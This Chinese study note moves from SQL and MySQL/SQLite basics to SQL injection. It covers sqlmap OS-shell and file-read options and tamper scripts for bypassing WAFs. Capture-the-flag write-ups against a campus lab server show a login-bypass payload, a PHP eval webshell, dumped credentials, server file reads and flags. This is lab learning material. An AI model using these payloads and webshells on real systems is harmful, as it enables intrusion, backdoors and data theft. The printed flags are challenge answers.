# SQL

## 什么是 SQL？

SQL (Structured Query Language:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）

??? note "What is RDBMS"
    即关系数据库管理系统(Relational Database Management System)的特点：
    1. 数据以表格的形式出现
    2. 每行为各种记录名称
    3. 每列为记录名称所对应的数据域
    4. 许多的行和列组成一张表单
    5. 若干的表单组成database

SQL（Structured Query Language）是管理关系型数据库的标准语言。简单来说，它就是让我们能与数据库"对话"的一种特殊语言。想象一下，数据库就像一个巨大的数字仓库，而 SQL 就是你向仓库管理员发出的精确指令——"给我找出所有去年购买过产品的客户"，"把这些商品按价格从高到低排列"，或者"更新用户张三的电话号码"。

我第一次接触 SQL 时，惊讶于它如此接近自然语言的表达方式。`SELECT * FROM users WHERE age > 30`——这不就是在说"从用户表中选出所有年龄大于 30 岁的记录"吗？

## SQL 与应用的关系

几乎所有现代应用都离不开数据库，而 SQL 就是与数据库交互的桥梁。无论是：

- 网站的用户数据存储
- 移动应用的本地缓存
- 企业级系统的交易记录
- 数据分析平台的海量信息

## SQL 与 DBMS 的关系

SQL 是**操作数据库的标准语言**，而 MySQL、SQLite 等则是**具体的数据库管理系统（DBMS）**。它们之间的关系可以这样理解：  

- **SQL** 是通用的查询语言，定义了如何与数据库交互（如 `SELECT`, `INSERT`, `UPDATE`, `DELETE`）。  
- **MySQL** 是一个**客户端 - 服务器型**的关系数据库，适合 Web 应用、企业级系统等需要多用户并发访问的场景。  
- **SQLite** 是一个**嵌入式**数据库，整个数据库就是一个文件，适合移动端、桌面应用或小型项目，无需额外服务器。  

??? note "主要区别"

    | 特性        | MySQL              | SQLite             |  
    |------------|--------------------|--------------------|  
    | **架构**    | 客户端-服务器模式   | 嵌入式，无独立服务 |  
    | **适用场景**| 高并发、多用户访问 | 单机、轻量级应用   |  
    | **存储方式**| 数据存储在服务器   | 整个DB是一个文件   |  
    | **性能**    | 适合大规模数据     | 轻量，低开销       |  

## 语法

[菜鸟教程](https://www.runoob.com/sql/sql-tutorial.html)

### 注释

```sql
/*
这是注释，支持多行
*/

-- 这也是注释 (注意后面有个空格)

# 这还是注释 

/*!version_number 当数据库版本大于 version_number(或 version_number 为空) 时注释内容会被执行，否则就是普通注释*/
```

### 查

**SELECT 语句用于从数据库中选取数据。**

结果被存储在一个结果表中，称为结果集。

```sql
if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)
if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)
```

```sql
SELECT column1, column2, ... FROM table_name;
```

- `column1`, `column2`, ...：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。

- `table_name`：要查询的表名称。

**SELECT DISITINCT 选出不同的值**

```sql
SELECT DISTINCT column1, column2, ...
FROM table_name;
```

select 返回的数据结构就是表头，从下面这个例子可以看出

=== "例 1"

    ```sql
    mysql> select sleep(2);
    +----------+
    | sleep(2) |
    +----------+
    |        0 |
    +----------+
    1 row in set (2.02 sec)
    ```

=== "例 2"

    ```sql
    mysql> SELECT 1, DATABASE(), VERSION(), USER(), ASCII('A'), CONCAT('A','B');
    +---+------------+-----------+----------------+------------+-----------------+
    | 1 | DATABASE() | VERSION() | USER()         | ASCII('A') | CONCAT('A','B') |
    +---+------------+-----------+----------------+------------+-----------------+
    | 1 | web        | 5.7.26    | root@localhost |         65 | AB              |
    +---+------------+-----------+----------------+------------+-----------------+
    1 row in set (0.00 sec)
    ```

**WHERE 子句 | 条件查询**

|运算符 | 描述|
|---|---|
|`=`| 等于|
|`<>`| 不等于。注释：在 SQL 的一些版本中，该操作符可被写成 `!=`|
|`>`| 大于|
|`<`| 小于|
|`>=`| 大于等于|
|`<=`|小于等于|
|`BETWEEN`| 在某个范围内|
|`LIKE`| 搜索某种模式|
|`IN`| 指定针对某个列的多个可能值|

**AND OR 条件**

```sql
SELECT * FROM Websites WHERE country='USA' OR country='CN';

SELECT * FROM Websites WHERE country='CN' AND alexa > 50;
```

**ORDER BY**

```sql
SELECT * FROM Websites ORDER BY alexa;

SELECT * FROM Websites
ORDER BY alexa DESC; //降序排序

SELECT * FROM Websites
ORDER BY country,alexa;//多列
```

**limit**

```sql
SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /*从第 N(从 0 开始) 条开始返回 M 条数据*/
SELECT col_name1, col_name2… FROM table_name LIMIT M OFFSET N  /*也可以这么写*/
```

**concat**

```sql
mysql> select concat(id,name) from chars;
+-----------------+
| concat(id,name) |
+-----------------+
| 1Yukikaze       |
| 2Mia            |
| 3Marimo         |
+-----------------+
3 rows in set (0.00 sec)


SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/
+------------------------+
| group_concat(id,name)  |
+------------------------+
| 1Yukikaze,2Mia,3Marimo |
+------------------------+
1 row in set (0.01 sec)
```

### 增

**INSERT**

id 字段自动更新，不需要插入

```sql
INSERT INTO table_name
VALUES (value1,value2,value3,...);

INSERT INTO table_name (column1,column2,column3,...)
VALUES (value1,value2,value3,...);

INSERT INTO Websites (name, url, country)
VALUES ('stackoverflow', 'http://stackoverflow.com/', 'IND');
```

### 删

同样要注意 WHERE 子句，否则会删除所有记录

```sql
DELETE FROM table_name
WHERE condition;
```

### 改

!!! note "请注意 SQL UPDATE 语句中的 WHERE 子句！"
    WHERE 子句规定哪条记录或者哪些记录需要更新。如果您省略了 WHERE 子句，所有的记录都将被更新！

```sql
UPDATE Websites 
SET alexa='5000', country='USA' 
WHERE name='菜鸟教程';
```

### 其他

```sql
SELECT SLEEP(2);

SELECT 1, DATABASE(), VERSION(), USER(), ASCII('A'), CONCAT('A','B');


SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /*从第 N(从 0 开始) 条开始返回 M 条数据*/
SELECT col_name1, col_name2… FROM table_name LIMIT M OFFSET N  /*也可以这么写*/

SELECT concat(col_name1, col_name2…) FROM table_name /*整合列数据*/
SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/
```

**一些常用的 URL 编码：**

|Character|URL Encode|
|---|---|
|Space|`%20`|
|#  |`%23`|
|' |`%27`|
|"| `%22`|
|+ |`%2B`|

`#+$-_.!*()`浏览器地址栏默认不编码，但是不意味着不能编码

## 应用 —— MySQL

> MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统) 应用软件之一。

MySQL 为关系型数据库 (Relational Database Management System), 这种所谓的"关系型"可以理解为"表格"的概念，一个关系型数据库由一个或数个表格组成
![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240702184602.webp)

- 表头 (header): 每一列的名称;
- 列 (col): 具有相同数据类型的数据的集合;
- 行 (row): 每一行用来描述某条记录的具体信息;
- 值 (value): 行的具体信息，每个值必须与该列的数据类型相同;
- **键 (key): 键的值在当前列中具有唯一性。**

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801213130.webp)

[Mysql 之自带四库之 sys 库\_mysql sys 库-CSDN 博客](https://blog.csdn.net/carefree2005/article/details/113798841)

### 安装

windows 下 phpstudy 环境变量配置

[mysql](https://www.cnblogs.com/PHP0222wangdong/p/10674222.html)

选择环境变量->选择下半区的系统变量里面的 Path
在 Path 中添加 php 和 Mysql 的地址

新建文件夹后，进入到`...\phpstudy_pro\WWW`这个文件夹，把你需要的网站代码传到这个文件夹中。

访问方法`locoalhost/文件夹名/文件名`

```sql
mysql –u root –p

mysql> SHOW DATABASES;  /*输出所有的数据库*/

mysql> USE db_name;  /*使用某个其中一个数据库*/

mysql> SHOW TABLES;  /*显示数据库中的表*/

mysql> SHOW COLUMNS FROM table_name; /*输出列*/
```

当数据库名字含有保留字时候，必须使用反引号

```sql
show columns from `table_name`;
show columns from db_name.`table_name`;
```

## 应用 —— Sqlite

SQLite 是一个轻量级的嵌入式关系型数据库，它以一个小型的 C 语言库的形式存在。它的设计目标是嵌入式的，而且已经在很多嵌入式产品中使用了它，它占用资源非常的低，在嵌入式设备中，可能只需要几百 K 的内存就够了。SQLite 还具有跨平台的特性，可以在多个操作系统上运行包括 Windows、MacOS、Linux 等。

### [DB Browser for SQLite](https://sqlitebrowser.org/dl/)

### SqliteStudio

[pawelsalawa/sqlitestudio](https://github.com/pawelsalawa/sqlitestudio): A free, open source, multi-platform SQLite database manager.

## Security 话题 —— SQL 注入

### sqlmap 使用

kali 自带 sqlmap
[MySQL 文件读写\_mysql 读写文件-CSDN 博客](https://blog.csdn.net/qq_45927266/article/details/119297840)

#### 基础功能

[【SQL 注入】Sqlmap 使用指南 (手把手保姆版) 持续更新\_sqlmap 使用教程-CSDN 博客](https://blog.csdn.net/weixin_43819747/article/details/136736688)
找注入点并检测：sqlmap –u <url>
列库显示数据库：sqlmap –u <url> --dbs
列表显示表：sqlmap –u <url> –D <db_name> --tables
列字段显示表中字段：sqlmap –u <url> –D <db_name> –T <table_name> --columns
显示字段内容：sqlmap –u <url> –D <db_name> –T <table_name> –C 字段 --dump

#### post 传参

[sqlmap 执行 POST 注入的两种方式\_sqlmap post-CSDN 博客](https://blog.csdn.net/qq_44159028/article/details/118566645)

#### 其他参数

**–batch**

使用方法：`sqlmap -u URL --batch`

使用–batch 参数，可以在所有需要用户输入的部分（通常是询问执行 yes 还是 no），执行默认操作，不需要用户再输入

#### 高级功能
>
> 参考 [SQLMap 使用详解 - 未完成的歌 QAQ - 博客园](https://www.cnblogs.com/wwcdg/p/15913888.html#3roles_154)

=== "1、`--level 5`：探测等级"

    参数--level 5 指需要执行的测试等级，一共有 5 个等级（1~5），不加 level 默认是 1。5 级包含的 Payload 最多，会自动破解出 cookie、XFF 等头部注入。当然，level 5 的运行速度也比较慢。

    这个参数会影响测试的注入点，GET 和 POST 的数据都会进行测试，HTTP cookie 在 level 为 2 时就会测试，HTTP User-Agent/Referer 头在 level 为 3 时就会测试。总之，在不确定哪个 payload 或参数为注入点时，为了保证全面性，建议使用高的 level 值。

=== "2、`--is-dba`：当前用户是否为管理权限"

    该命令用于查看当前账户是否为数据库管理员账户，如下所示：

    ```shell
    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba
    ```

=== "3、`--roles`：列出数据库管理员角色"

    该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色，如图所示：

    ```shell
    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --roles
    ```

=== "4、`--referer`：HTTP referer 头"

    Sqlmap 可以在请求中伪造 HTTP 中的 referer，当--level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，例：

    ```shell
    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --referer http://www.baidu.com
    ```

=== "5、`--sql-shell`：运行自定义 SQL 语句"

    该命令用于执行指定的SQL语句，如下所示，假设执行select * from users limit 0,1语句，如下所示：

    ```shell
    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --sql-shell
    ```

=== "6、`--os-cmd`，`--os-shell`：运行任意操作系统命令"

    在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。

    如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。

    用`--os-shell`参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。

    Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是--is-dba的值要为True)。

    - 执行系统命令：


    ```shell
    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-cmd=ipconfig
    ```
    执行后根据提示选择网站语言，然后回车，指定目标站点根目录，然后继续回车即可完整执行命令。

    - 执行 shell：

    ```shell
    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell
    ```
    执行后根据提示选择网站语言，然后回车，指定目标站点根目录后回车，输入命令即可执行。

    执行命令后会在网站根目录上传两个文件：tmpbxbxz.php、tmpuoiuz.php(此文件为上传页面)

=== "7、`--file-read`：从数据库服务器中读取文件"

    该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。
    ```shell
    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read "C:/11.txt"
    ```
    在这里插入图片描述
    执行完会把文件保存到本地目录下
    在这里插入图片描述

=== "8、`--file-write` `--file-dest`：上传文件到数据库服务器中"

    该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。
    ```shell
    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write "C:/1.txt" --file-dest "C:/windows/Temp/1.php"
    ```
    执行结束即可把本地的1.txt 文件上传到目标服务器下
    在这里插入图片描述

#### tamper

–tamper 参数对数据做修改来绕过 waf 等设备

```shell
sqlmap -u <url> --tamper <模块名>
```

sqlmap 的绕过脚本在目录 usr/share/golismero/tools/sqlmap/tamper 下

??? note "脚本目录"

    **apostrophemask.py**
    适用数据库：ALL
    作用：将引号替换为 utf-8，用于过滤单引号
    使用脚本前：`tamper("1 AND '1'='1")`
    使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`

    **base64encode.py**
    适用数据库：ALL
    作用：替换为 base64 编码
    使用脚本前：`tamper("1' AND SLEEP(5)#")`
    使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`

    **multiplespaces.py**
    适用数据库：ALL
    作用：围绕 sql 关键字添加多个空格
    使用脚本前：`tamper('1 UNION SELECT foobar')`
    使用脚本后：`1 UNION SELECT foobar`

    **space2plus.py**
    适用数据库：ALL
    作用：用加号替换空格
    使用脚本前：`tamper('SELECT id FROM users')`
    使用脚本后：`SELECT+id+FROM+users`

    **nonrecursivereplacement.py**
    适用数据库：ALL
    作用：作为双重查询语句，用双重语句替代预定义的 sql 关键字（适用于非常弱的自定义过滤器，例如将 select 替换为空）
    使用脚本前：`tamper('1 UNION SELECT 2--')`
    使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`

    **space2randomblank.py**
    适用数据库：ALL
    作用：将空格替换为其他有效字符
    使用脚本前：`tamper('SELECT id FROM users')`
    使用脚本后：`SELECT%0Did%0DFROM%0Ausers`

    **unionalltounion.py**
    适用数据库：ALL
    作用：将 union allselect 替换为 unionselect
    使用脚本前：`tamper('-1 UNION ALL SELECT')`
    使用脚本后：`-1 UNION SELECT`

    **securesphere.py**
    适用数据库：ALL
    作用：追加特定的字符串
    使用脚本前：`tamper('1 AND 1=1')`
    使用脚本后：`1 AND 1=1 and '0having'='0having'`

    **space2dash.py**
    适用数据库：ALL
    作用：将空格替换为--，并添加一个随机字符串和换行符
    使用脚本前：`tamper('1 AND 9227=9227')`
    使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`

    **space2mssqlblank.py**
    适用数据库：Microsoft SQL Server
    测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005
    作用：将空格随机替换为其他空格符号 ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
    使用脚本前：`tamper('SELECT id FROM users')`
    使用脚本后：`SELECT%0Eid%0DFROM%07users`

    **between.py**
    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
    作用：用 NOT BETWEEN 0 AND #替换>
    使用脚本前：`tamper('1 AND A > B--')`
    使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`

    **percentage.py**
    适用数据库：ASP
    测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
    作用：在每个字符前添加一个%
    使用脚本前：`tamper('SELECT FIELD FROM TABLE')`
    使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`

    **sp_password.py**
    适用数据库：MSSQL
    作用：从 T-SQL 日志的自动迷糊处理的有效载荷中追加 sp_password
    使用脚本前：tamper('1 AND 9227=9227-- ')
    使用脚本后：1 AND 9227=9227-- sp_password

    **charencode.py**
    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
    作用：对给定的 payload 全部字符使用 url 编码（不处理已经编码的字符）
    使用脚本前：tamper('SELECT FIELD FROM%20TABLE')
    使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

    **randomcase.py**
    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
    作用：随机大小写
    使用脚本前：tamper('INSERT')
    使用脚本后：INseRt

    **charunicodeencode.py**
    适用数据库：ASP、ASP.NET
    测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3
    作用：适用字符串的 unicode 编码
    使用脚本前：tamper('SELECT FIELD%20FROM TABLE')
    使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045

    **space2comment.py**
    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
    作用：将空格替换为/**/
    使用脚本前：tamper('SELECT id FROM users')
    使用脚本后：SELECT/**/id/**/FROM/**/users

    **equaltolike.py**
    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5
    作用：将=替换为 LIKE
    使用脚本前：tamper('SELECT * FROM users WHERE id=1')
    使用脚本后：SELECT * FROM users WHERE id LIKE 1

    **equaltolike.py**
    测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
    作用：将>替换为 GREATEST，绕过对>的过滤
    使用脚本前：tamper('1 AND A > B')
    使用脚本后：1 AND GREATEST(A,B+1)=A

    **modsecurityversioned.py**
    适用数据库：MySQL
    测试通过数据库：MySQL 5.0
    作用：过滤空格，使用 mysql 内联注释的方式进行注入
    使用脚本前：tamper('1 AND 2>1--')
    使用脚本后：1 /*!30874AND 2>1*/--

    **space2mysqlblank.py**
    适用数据库：MySQL
    测试通过数据库：MySQL 5.1
    作用：将空格替换为其他空格符号 ('%09', '%0A', '%0C', '%0D', '%0B')
    使用脚本前：tamper('SELECT id FROM users')
    使用脚本后：SELECT%0Bid%0DFROM%0Cusers

    **modsecurityzeroversioned.py**
    适用数据库：MySQL
    测试通过数据库：MySQL 5.0
    作用：使用内联注释方式（/*!00000*/）进行注入
    使用脚本前：tamper('1 AND 2>1--')
    使用脚本后：1 /*!00000AND 2>1*/--

    **space2mysqldash.py**
    适用数据库：MySQL、MSSQL
    作用：将空格替换为 -- ，并追随一个换行符
    使用脚本前：tamper('1 AND 9227=9227')
    使用脚本后：1--%0AAND--%0A9227=9227

    **space2morehash.py**
    适用数据库：MySQL >= 5.1.13
    测试通过数据库：MySQL 5.1.41
    作用：将空格替换为#，并添加一个随机字符串和换行符
    使用脚本前：tamper('1 AND 9227=9227')
    使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227

    **appendnullbyte.py**
    适用数据库：ALL
    作用：在有效载荷的结束位置加载 null 字节字符编码
    使用脚本前：tamper('1 AND 1=1')
    使用脚本后：1 AND 1=1%00

    **randomcomments.py**
    适用数据库：ALL
    作用：用注释符分割 sql 关键字
    使用脚本前：tamper('INSERT')
    使用脚本后：I/**/N/**/SERT

### 实例 1 [SchoolBus - SQL injection](https://zjusec.com/challenges/16)

打开网站，发现是一个问答的网站，非常明显的 sql 注入点
![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801183459.webp)

因为提示了检测空格，所以使用了 tamper 的 space2comment.py

```shell
## 查看用户
sqlmap -u http://10.214.160.13:10002/?questionid=0 --current-user --tamper space2randomblank.py
## 查看数据库
sqlmap -u http://10.214.160.13:10002/?questionid=0 --current-db --tamper space2randomblank.py
## 查看表
sqlmap -u http://10.214.160.13:10002/?questionid=0 --current-db --tamper space2randomblank.py -D aaa_web2 --tables
## 查看列
sqlmap -u http://10.214.160.13:10002/?questionid=0 --current-db --tamper space2randomblank.py -D aaa_web2 -T flag_is_here --columns
## 查看字段
sqlmap -u http://10.214.160.13:10002/?questionid=0 --current-db --tamper space2randomblank.py -D aaa_web2 -T flag_is_here -C "flag" --dump
```

使用上面的语句可以一步步使用 sqlmap 获取 flag

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__cc3a0a22acb55bd08b8eed78d0c2d20.webp)

### 实例 2 [SchoolBus - php include 文件注入](http://10.214.160.13:10001/index.php?f=upload.php)

> 拓展链接
>
> - [技术剖析中国菜刀原理](https://blog.csdn.net/JackLiu16/article/details/79418652)
> - [PHP 文件包含漏洞全面总结 - Zeker62 - 博客园](https://www.cnblogs.com/Zeker62/p/15322771.html)
> - [Kali linux 菜刀 (weevely3)](https://blog.csdn.net/weixin_41489908/article/details/115875988) 这个最后没用到

打开网站是一个上传文件的页面，上传文件之后会显示文件文件名
![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801182113.webp)

提示构造一句话木马，所以写了一个 php 文件

```php
<?php @eval($_GET['123']); ?>
```

但是直接上传会被过滤，所以不能直接上传后缀名为 php 的文件。尝试上传了一张 jpg 图片，发现是可以的。

上传后会给出一个`upload/202x0x0xxxxxxx.jpg`(后面六位尝试后发现不连续，应该是随机的，前面 8 位是日期) 的地址，访问这个地址，发现就是我们上传的图片。

这个时候要考虑文件引用的利用。

在经过尝试之后，发现拼接 url 到`index.php`的查询之后，会出现文件引用

```html
http://10.214.160.13:10001/index.php?f=upload/20240801xxxxxx.png
```

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__dfb524f36bde612006171278b5b5ec8.webp)

这个时候就可以使用蚁剑等工具进行文件操作，上传文件，执行命令等了。

右键选择“添加数据”，填入上面的 url 路径，和我们构造的 php 密码。
![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801182913.webp)

点击“测试链接”，发现可以。

直接连接后会出现网站的管理界面。

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801183043.webp)

相当于取得了网站的管理权限。就可以拿到 flag 了。

```text
flag = AAA{m310dy_1s_wAitinG_4_y0u_h3r3_qq_qun_386796080}
```

这里可以看一下`file.php`的结构，确实过滤掉了 php 文件。文件命名也和猜测差不多。

```php
<?php
 $filetype=["jpg","gif","png","rar","zip"];
 if ($_FILES["file"]["error"] > 0){
  echo "这里好像发生了什么错误，请稍等，估计修不好。 " . "<br />";
 }else{
  $file_type=explode(".",$_FILES["file"]["name"]);
  if (in_array($file_type[count($file_type)-1],$filetype)){
   if ($_FILES["file"]["size"] > 2000000){
    echo "啊好大 " . "<br />";
   }else{
    $filename=date('Ymd').rand(100000,999999).".".$file_type[count($file_type)-1];

    if (file_exists("upload/" . $filename)){
     echo $filename . " 已经存在了噢～ ";
    }else{
     move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename);
     echo "Stored in: " . "upload/" . $filename;
    }
   }
  }else{
   echo "啊不要这样子对人家啦～";
  }
   }

?>
```

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__0e185ed04c09d30db92fed5775aa16a.webp)

### 实例 3

登录界面注入

用户名 `aaa' or 1=1 #`
密码随便

账号 admin
密码
nginx/1.10.0 (Ubuntu)

在这里卡了蛮久的，本来想通过朴素的万能密码的方式来登录，但是没有成功，在这里大概卡了一天半。

后来逛了逛校巴，发现 welcome 中有几道 web 的题目很相关，一道是教 sqlmap 的，另一道是教文件包含的。

做完了那两个题，再回头看这个题，思路就比较清晰了。

人工注入感觉我的 sql 水平应该达不到，所以尝试使用 sqlmap 进行注入

这里学习了一下 post 注入的方法
![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801201104.webp)

先将 burp 的报文保存到一个文件中，然后使用 sqlmap 进行注入，使用`-r`参数加载文件，使用`-p`参数指定注入点

```shell
sqlmap -r ./test.txt -p username --dbs
```

```sql
[08:03:24] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] web400
```

```shell
sqlmap -r ./test.txt -p username -D web400 --tables
```

```sql
[08:04:00] [INFO] fetching tables for database: 'web400'
Database: web400
[1 table]
+-------+
| USERS |
+-------+
```

```shell
sqlmap -r ./test.txt -p username -D web400 -T USERS --columns
```

```text
[08:04:13] [INFO] fetching columns for table 'USERS' in database 'web400'
Database: web400
Table: USERS
[3 columns]
+----------+------+
| Column   | Type |
+----------+------+
| data     | text |
| password | text |
| username | text |
+----------+------+
```

```shell
sqlmap -r ./test.txt -p username -D web400 -T USERS -C "data,password,username" --dump
```

```text
[08:04:48] [INFO] fetching entries of column(s) '`data`,password,username' for table 'USERS' in database 'web400'
Database: web400
Table: USERS
[1 entry]
+------------------+----------------------------+----------+
| data             | password                   | username |
+------------------+----------------------------+----------+
| This is a secret | zhegemimanigujicaibuchulai | admin    |
+------------------+----------------------------+----------+
```

这个时候就完成了第一步，也就是使用管理者账号登录

??? note "**查看权限**"
    发现aaactf这个账号的权限是FILE
    ```
[08:43:11] [INFO] fetching database users privileges
    database management system users roles:
    [*] 'aaactf'@'localhost' [1]:
        role: FILE
    [*] 'debian-sys-maint'@'localhost' (administrator) [28]:
        role: ALTER
        role: ALTER ROUTINE
        role: CREATE
        role: CREATE ROUTINE
        role: CREATE TABLESPACE
        role: CREATE TEMPORARY TABLES
        role: CREATE USER
        role: CREATE VIEW
        role: DELETE
        role: DROP
        role: EVENT
        role: EXECUTE
        role: FILE
        role: INDEX
        role: INSERT
        role: LOCK TABLES
        role: PROCESS
        role: REFERENCES
        role: RELOAD
        role: REPLICATION CLIENT
        role: REPLICATION SLAVE
        role: SELECT
        role: SHOW DATABASES
        role: SHOW VIEW
        role: SHUTDOWN
        role: SUPER
        role: TRIGGER
        role: UPDATE
    [*] 'mysql.sys'@'localhost' [1]:
        role: USAGE
    [*] 'root'@'localhost' (administrator) [28]:
        role: ALTER
        role: ALTER ROUTINE
        role: CREATE
        role: CREATE ROUTINE
        role: CREATE TABLESPACE
        role: CREATE TEMPORARY TABLES
        role: CREATE USER
        role: CREATE VIEW
        role: DELETE
        role: DROP
        role: EVENT
        role: EXECUTE
        role: FILE
        role: INDEX
        role: INSERT
        role: LOCK TABLES
        role: PROCESS
        role: REFERENCES
        role: RELOAD
        role: REPLICATION CLIENT
        role: REPLICATION SLAVE
        role: SELECT
        role: SHOW DATABASES
        role: SHOW VIEW
        role: SHUTDOWN
        role: SUPER
        role: TRIGGER
        role: UPDATE
    ```

获得了 admin 账号，如果这个时候再能获得一个 RCE 就无敌了

想到看到过的使用 sqlmap 的`--os-shell`参数，可以直接执行系统命令，所以可以直接查看文件。
但是必须满足三个条件

- 当前 sql 注入用户必须为 DBA 权限（--is-dba 为 true）
- 需要知道网站的绝对路径
- My.ini 文件中的这项配置 secure_file_priv=””为空

!!! note "**获得物理地址**"
    单引号注入

    ```
    Fatal error: Uncaught Error: Call to a member function fetch_assoc() on boolean in /home/web/www.zjusec.com/migrate.php:80 Stack trace: #0 {main} thrown in /home/web/www.zjusec.com/migrate.php on line 80
    ```

    `/home/web/www.zjusec.com/migrate.php`是物理地址

```shell
[09:22:55] [INFO] trying to upload the file stager on '/home/web/www.zjusec.com/' via LIMIT 'LINES TERMINATED BY' method
[09:22:56] [WARNING] unable to upload the file stager on '/home/web/www.zjusec.com/'
[09:22:56] [INFO] trying to upload the file stager on '/home/web/www.zjusec.com/' via UNION method
[09:22:57] [WARNING] expect junk characters inside the file as a leftover from UNION query
[09:22:57] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[09:22:57] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 8 times
```

!!! bug "中间还尝试过使用 `--sql-shell`"
    可以读是可以读，但是想要使用 system 命令的时候，一直没有回显，所以放弃了

于是换了另一种方法，使用`--file-read`参数，读取服务器上的文件

首先先根据 hint 读了一下`/etc/nginx/nginx.conf`文件

然后又想到刚才获得了`/home/web/www.zjusec.com/migrate.php`这个地址，于是读取这个文件

获得了 php 文件

根据源码，就可以很轻松的找到同目录下的`flag.php`文件

```text
AAA{now_y0u_can_try_web_400_lol}
```

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__57e4e1a1e9d5e59769ac273e5d580a0.webp)

这里拿不到 shell 权限尊都很难受啊

所以学习了一下常见 nginx 的配置文件

先读取了一下`/etc/nginx/nginx.conf`文件
并没有发现什么

再读取了一下`/etc/nginx/sites-enabled/default`文件，发现了第二题的入口地址
